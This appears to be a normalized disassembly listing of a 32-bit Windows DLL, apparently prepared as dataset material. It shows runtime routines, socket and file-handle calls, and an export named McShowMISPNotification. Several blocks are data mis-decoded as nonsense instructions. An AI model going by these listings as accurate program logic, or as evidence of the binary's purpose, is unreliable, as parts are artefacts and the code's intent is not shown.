push ecx
call sub_100160ab
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1001592b
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10016530
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_1001403c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_1001403c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_100011eb
add al 0x2
add [ ebp + 0x50 ] dl
mov eax [ esi + 0x20a92 ]
0x200efa5 0xb88b
sub_10001698
push es
add al 0x0
add cl [ ebp - 0x21171 ]
add [ ebx ] esi
retn 0x5357
sub_100016a6
mov ax [ ebp - 0xfe0412 ]
0x200eaee 0x868
sub_100016ef
cmp eax 0x8b0b77f7
mov ebp 0xff01f9ce
jmp sub_10001698
sub_1000185f
neg ebx
or ecx edx
push ecx
0x2007613 0xc683
sub_10001cd1
mov eax 0x1
retn
sub_10002cc0
mov [ ecx ] r--data
jmp sub_10009900
McShowMISPNotification
retn
sub_10004080
mov eax [ ebp - 0x14 ]
push eax
call sub_10009140
add esp 0x4
push 0x0
push 0x0
call sub_10009ea4
int3
sub_10004400
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_10009932
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10004907
inc ebp
out dx al
aas
add dh [ ebx ]
retn 0x4b8d
sub_1000504c
mov [ edi + 0x1ff0090 ] 0x0
0x200b148 0x1f8a
sub_100050ce
iretd
sub_10005110
add [ edx ] eax
add [ edi + 0x1fc2385 ] cl
[ eax + eax + 0x52 ]
sub_1000511c
mov [ edi + 0x1fffe20 ] 0x0
0x200b078 0x568
sub_1000512a
add [ edx ] eax
add [ edi + 0x1fb1f8d ] cl
[ eax + eax + 0x53 ]
sub_10005136
mov [ edi + 0x1fffd1c ] 0x0
0x200b05e 0xc683
sub_1000544f
clc
std
add edi edi
push ebx
mov ax [ ebp - 0xfe020a ]
0x200ad40 0x878d
sub_1000546c
enter 0xc485 0xe
mov edx 0x2020a
sub eax 0x8f07edf1
movsb [ edi ] [ esi ]
add [ es : edx ] al
add [ edx ] al
lea ecx [ esi + esi * 8 - 0x7a7e0001 ]

sub_10007352
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
retn
push 0x2
push eax
call [ shutdown@IAT ]
push [ esi ]
call [ closesocket@IAT ]
or [ esi ] 0xffffffff
sub_10007422
push ebp
mov ebp esp
push 0x6
push 0x1
push 0x2
call [ socket@IAT ]
mov ecx [ ebp + 0x8 ]
cmp eax 0xffffffff
mov [ ecx ] eax
setne al
pop ebp
retn 0x4
sub_10008c7c
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1000919c
j_sub_10009900
jmp sub_10009900
sub_10008c8c
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10009932
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10008cd9
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10009932
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10008d26
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10009932
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10008ece
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_1000ba72
add esp 0xc
pop ebp
retn
sub_10008ee4
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10008ece
sub_10009014
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10009140
sub_1000901f
mov edi edi
push ebp
mov ebp esp
call sub_1000bc4d
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_10009031
call sub_1000bc4d
mov ecx eax
mov eax [ ecx + 0x14 ]
imul eax eax 0x343fd
add eax 0x269ec3
mov [ ecx + 0x14 ] eax
shr eax 0x10
and eax 0x7fff
retn
sub_10009123
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10009052
add esp 0x14
pop ebp
retn
sub_10009140
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10009957
sub_1000981c
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_10009839
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_10009886
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_10009957
pop ecx
sub_10009900
mov [ ecx ] r--data
jmp sub_10009886
sub_10009b0d
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_1000f053
pop ecx
retn
sub_10009c0a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10009b5e
add esp 0x14
pop ebp
retn
sub_10009d00
cmp [ ebp + 0x10 ] edi
jne r-xdata
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_1000bae3
sub_10009e5e
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_1000fc79
pop ecx
pop ecx
retn
sub_1000a3cb
push [ ebp + 0x8 ]
call sub_100106dc
pop ecx
retn
sub_1000a3d5
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a319
add esp 0xc
pop ebp
retn
sub_1000a4ee
push [ ebp + 0x8 ]
call sub_100106dc
pop ecx
retn
sub_1000a5d1
push esi
call sub_100106dc
pop ecx
retn
sub_1000b602
pushfd
lodsd [ esi ]
add [ eax ] dl
fwait
stosd [ edi ]
add [ eax ] dl

sub_1000b622
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1000baa6
call [ TlsAlloc@IAT ]
retn 0x4
sub_1000bbc2
push 0xd
call sub_10011d66
pop ecx
retn
sub_1000bbcb
push 0xc
call sub_10011d66
pop ecx
retn
sub_1000bd81
push 0xd
call sub_10011d66
pop ecx
retn
sub_1000bd8d
push 0xc
call sub_10011d66
pop ecx
retn
sub_1000cd65
call sub_1000ebcb
retn
sub_1000cd6b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1000cd2f
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_1000cd82
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1000e009
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_1000e2d7
push 0xd
call sub_10011d66
pop ecx
retn
sub_1000e6a6
push 0xd
call sub_10011d66
pop ecx
retn
sub_1000e6df
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_1000e545
pop ecx
mov [ rw-data ] 0x1
sub_1000ea2a
push 0xc
call sub_10011d66
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_1000eb4d
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_1000eb6b
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
sub_1000ebaa
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1000eb7f
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_1000ebc2
push 0x8
call sub_10011e3f
pop ecx
retn
sub_1000ebcb
push 0x8
call sub_10011d66
pop ecx
retn
sub_1000eded
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_10011d66
pop ecx
sub_1000ee02
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_1000ecc2
add esp 0xc
pop ebp
retn
sub_1000ee18
push 0x1
push 0x0
push 0x0
call sub_1000ecc2
add esp 0xc
retn
sub_1000ee27
mov edi edi
push ebp
mov ebp esp
call sub_1000f01a
push [ ebp + 0x8 ]
call sub_1000ee6b
pop ecx
push 0xff
call sub_1000ee02
int3
sub_1000f0ba
push 0xe
call sub_10011d66
pop ecx
retn
sub_1000f985
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_1000ff70
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10013210
sub_1000ff86
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10013210
sub_10010142
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1001010a
pop ecx
pop ecx
pop ebp
retn
sub_10010649
call sub_10011086
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_10009957
pop ecx
retn
call sub_100132f5
sub_10010b08
push 0x1
call sub_10011d66
pop ecx
retn
sub_10010bf6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_10010b20
add esp 0xc
pop ebp
retn 0x4
sub_10010c29
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_10014045
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_10010c5b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_10010b20
add esp 0xc
pop ebp
retn 0x8
sub_10010ec0
push ebx
call sub_10014276
pop ecx
retn
sub_1001104e
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_10010718
pop ecx
pop ecx
retn
sub_1001107d
push 0x1
call sub_10011d66
pop ecx
retn
sub_10011086
push 0x1
call sub_10010fac
pop ecx
retn
sub_1001108f
and [ rw-data ] 0x0
retn
sub_100111fc
push [ ebp + 0x8 ]
call sub_10014276
pop ecx
retn
sub_100119cf
push ebx
call sub_10014276
pop ecx
retn
sub_10011a99
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_10011c04
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10011aaf
add esp 0x14
pop ebp
retn
sub_10011d66
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10011e36
push 0xa
call sub_10011d66
pop ecx
retn
sub_1001210f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10011ff9
add esp 0x10
pop ebp
retn
sub_100129b0
push 0x8
push r--data
call sub_1000f940
call sub_1000bc4d
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_10014ff0
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_100129d0
xor eax eax
inc eax
retn
sub_100129e9
call sub_1000bc4d
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_100129b0
call eax
sub_10012a20
xor eax eax
inc eax
retn
sub_10012a34
push sub_100129b0
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_10012a45
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_10012a9a
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_10012c0e
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_10011d66
pop ecx
sub_10012c4a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10012c59
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10012d8b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_100131ec
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_10013199
add esp 0x10
pop ebp
retn
sub_10013388
push 0x1
call sub_10011d66
pop ecx
retn
sub_10013dad
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10013ba9
add esp 0x10
pop ebp
retn
sub_10013f13
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10013dc7
add esp 0x10
pop ebp
retn
sub_10014019
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_10013f50
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_10014064
call eax
retn
sub_1001426d
push 0xa
call sub_10011d66
pop ecx
retn
sub_1001436f
push 0xa
call sub_10011d66
pop ecx
retn
sub_1001442d
push 0xb
call sub_10011d66
pop ecx
retn
sub_10014507
push ebx
call sub_10014276
pop ecx
retn
sub_10014551
push 0x2
call sub_1000ee27
sub_10014d73
push ebx
call sub_10014276
pop ecx
retn
sub_10015336
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_10015355
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_10015828
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_1001583c
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10008d64
jmp sub_10015828
sub_1001584b
mov [ ecx ] r--data
jmp sub_10009900
sub_100159a9
push [ ebp - 0x14 ]
call sub_100158dc
pop ecx
retn
sub_100159ed
call sub_1000bc4d
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_1000bc4d
dec [ eax + 0x90 ]
sub_10015a8f
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_10015a98
mov esp [ ebp - 0x18 ]
call sub_100129b0
sub_10015b40
push 0x4
mov eax sub_10016834
call sub_100157bc
call sub_1000bc4d
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_100129e9
call sub_100129fc
sub_10015c19
mov eax [ ebp - 0x14 ]
call sub_10015a07
retn
sub_10015e90
xor eax eax
inc eax
retn
sub_10015e94
mov esp [ ebp - 0x18 ]
call sub_100129b0
sub_10015f29
xor eax eax
inc eax
retn
sub_10015f2d
mov esp [ ebp - 0x18 ]
call sub_100129b0
sub_10016420
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10009932
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1001657c
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_10016590
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10008d64
mov eax r--data
jmp sub_10015465
sub_100165b0
mov edi [ ebp + 0x8 ]
jmp sub_100067b5
sub_100165b8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10008d64
mov eax r--data
jmp sub_10015465
sub_100165e0
mov esi [ ebp + 0x8 ]
add esi 0x8
jmp sub_10003d60
sub_100165eb
mov esi [ ebp + 0x8 ]
add esi 0x28
jmp sub_10003d60
sub_100165f6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10008d64
mov eax r--data
jmp sub_10015465
sub_10016611
lea esi [ ebp - 0x2c ]
jmp sub_10003d60
sub_10016619
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_10008d64
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10008d64
mov eax r--data
jmp sub_10015465
j_McShowMISPNotification#3
jmp McShowMISPNotification
sub_10016645
mov esi [ ebp - 0x18 ]
add esi 0x8
jmp sub_10003d60
sub_10016650
mov esi [ ebp - 0x18 ]
add esi 0x28
jmp sub_10003d60
sub_1001665b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10008d64
mov eax r--data
jmp sub_10015465
sub_10016680
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10008d64
mov eax r--data
jmp sub_10015465
j_McShowMISPNotification#2
jmp McShowMISPNotification
j_McShowMISPNotification#4
jmp McShowMISPNotification
sub_100166aa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10008d64
mov eax r--data
jmp sub_10015465
sub_100166d0
lea esi [ ebp - 0x1c7c ]
jmp sub_100036d0
sub_100166db
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1ca8 ]
xor ecx eax
call sub_10008d64
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10008d64
mov eax r--data
jmp sub_10015465
sub_10016710
lea esi [ ebp - 0xc7c ]
jmp sub_100036d0
j_McShowMISPNotification
jmp McShowMISPNotification
j_McShowMISPNotification#5
jmp McShowMISPNotification
sub_10016725
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc90 ]
xor ecx eax
call sub_10008d64
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10008d64
mov eax r--data
jmp sub_10015465
sub_10016750
lea esi [ ebp - 0x87c ]
jmp sub_100036d0
sub_1001675b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x9c0 ]
xor ecx eax
call sub_10008d64
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10008d64
mov eax r--data
jmp sub_10015465
sub_10016790
lea esi [ ebp - 0x60 ]
jmp sub_10005da0
sub_10016798
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10008d64
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10008d64
mov eax r--data
jmp sub_10015465
sub_100167c0
lea esi [ ebp - 0x58 ]
jmp sub_10005da0
sub_100167c8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_10008d64
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10008d64
mov eax r--data
jmp sub_10015465
sub_100167f0
mov eax [ ebp - 0x414 ]
push eax
call sub_10009140
pop ecx
retn
sub_100167fe
mov eax [ ebp - 0x414 ]
push eax
call sub_10009140
pop ecx
retn
sub_1001680c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x418 ]
xor ecx eax
call sub_10008d64
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10008d64
mov eax r--data
jmp sub_10015465
sub_10016834
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10008d64
mov eax r--data
jmp sub_10015465
sub_1001684f
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_10009900
